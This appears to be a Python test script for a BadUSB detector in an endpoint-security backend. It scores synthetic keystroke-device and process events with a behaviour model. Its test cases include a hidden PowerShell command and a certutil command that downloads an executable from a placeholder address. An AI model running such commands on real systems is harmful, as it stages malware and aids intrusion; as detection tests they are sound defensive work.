import sys, os, warnings
from datetime import datetime, timedelta, timezone

warnings.filterwarnings("ignore")
from _paths import BACKEND, DATA, DATASETS  # noqa: E402  (tests/_paths.py)
sys.path.insert(0, str(BACKEND))
os.chdir(str(BACKEND))
from app.services import badusb, cvss
from app.services.ml import runtime
from app.services.ml.data import load_csv
from app.services.ml.model import BehaviorModel

T0 = datetime.now(timezone.utc).replace(microsecond=0)


def device(sec, **fields):
    data = {"deviceId": r"HID\VID_16C0&PID_27DB&MI_00\8&2A9D4F3F&0&0000", "deviceDescription": "HID Keyboard Device",
            "classId": "{4d36e96b-e325-11ce-bfc1-08002be10318}", "className": "Keyboard",
            "vendorIds": r"HID\VID_16C0&PID_27DB&REV_0100", "compatibleIds": r"HID\VID_16C0&UP:0001_U:0006"}
    data.update(fields)
    return {"endpoint_id": 8, "event_time": T0 + timedelta(seconds=sec), "rule_level": 3, "severity": "Info",
            "event_type": "USB Device", "event_user": None, "windows_event_id": "6416", "wazuh_alert_id": f"d{sec}",
            "details": {"data": {"win": {"eventdata": data}}}}


def proc(sec, name, cmd, user="u"):
    return {"endpoint_id": 8, "event_time": T0 + timedelta(seconds=sec), "rule_level": 3, "severity": "Info",
            "event_type": "Process", "event_user": user, "windows_event_id": "4688", "wazuh_alert_id": f"p{sec}",
            "details": {"data": {"win": {"eventdata": {
                "newProcessName": "C:\\Windows\\System32\\" + name, "subjectUserName": user,
                "parentProcessName": r"C:\Windows\explorer.exe", "commandLine": cmd}}}}}


print("keyboard_description of the keyboard:", badusb.keyboard_description(device(0)["details"]))
print("flash drive:", badusb.keyboard_description(device(0, deviceDescription="USB Mass Storage Device", className="USB", deviceId=r"USB\VID_0781&PID_5567\4C53", vendorIds="", compatibleIds=r"USB\Class_08&SubClass_06&Prot_50")["details"]))
print("mouse:", badusb.keyboard_description(device(0, deviceDescription="HID-compliant mouse", className="Mouse", vendorIds="", compatibleIds=r"HID\VID_046D&UP:0001_U:0002", deviceId=r"HID\VID_046D&PID_C077\7")["details"]))
print("boot-keyboard interface of a composite device:", badusb.keyboard_description(device(0, deviceDescription="USB Input Device", className="HIDClass", deviceId=r"USB\VID_1209&PID_0001&MI_00\7", compatibleIds=r"USB\Class_03&SubClass_01&Prot_01")["details"]))

rows = load_csv(str(DATASETS / "endpoint-8.csv.gz"), endpoint_id=8, user_actions_only=True)
model = BehaviorModel(requirements=cvss.requirements_for(None)).fit(rows)
get_model = lambda eid: model

cases = {
    "keyboard, then cmd.exe 3 s later": [device(0), proc(3, "cmd.exe", "cmd.exe")],
    "keyboard, then powershell 3 s later": [device(0), proc(3, "powershell.exe", "powershell -nop -w hidden -c whoami")],
    "keyboard, then cmd.exe 40 s later": [device(0), proc(40, "cmd.exe", "cmd.exe")],
    "flash drive, then cmd.exe 3 s later": [device(0, deviceDescription="USB Mass Storage Device", className="USB", deviceId=r"USB\VID_0781&PID_5567\4C53", vendorIds="", compatibleIds=r"USB\Class_08&SubClass_06&Prot_50"), proc(3, "cmd.exe", "cmd.exe")],
    "keyboard, then notepad 3 s later": [device(0), proc(3, "notepad.exe", "notepad.exe")],
    "keyboard, then certutil -urlcache (worse than BadUSB)": [device(0), proc(3, "certutil.exe", r"certutil -urlcache -f http://198.51.100.7/a.exe C:\Users\Public\a.exe")],
}
for title, events in cases.items():
    runtime.apply(events, get_model)
    e = events[-1]
    print(f"\n{title}\n   risk={e['risk_score']} {e['severity']}  {e['risk_reason']}")

# the keyboard was recognised in an earlier batch: found through the lookup
stored = [(T0, "HID Keyboard Device (VID_16C0 PID_27DB)")]
lookup = lambda eid, start, end: [(t, d) for t, d in stored if start <= t <= end]
events = [proc(4, "cmd.exe", "cmd.exe")]
runtime.apply(events, get_model, devices=lookup)
print("\nkeyboard found in the database (earlier batch):", events[0]["risk_score"], events[0]["severity"], events[0]["risk_reason"])
events = [proc(4, "cmd.exe", "cmd.exe")]
runtime.apply(events, lambda eid: None, devices=lookup)
print("no behaviour model on the endpoint:", events[0]["risk_score"], events[0]["severity"], events[0]["risk_reason"])
print("details['cvss']:", events[0]["details"]["cvss"]["vector"])
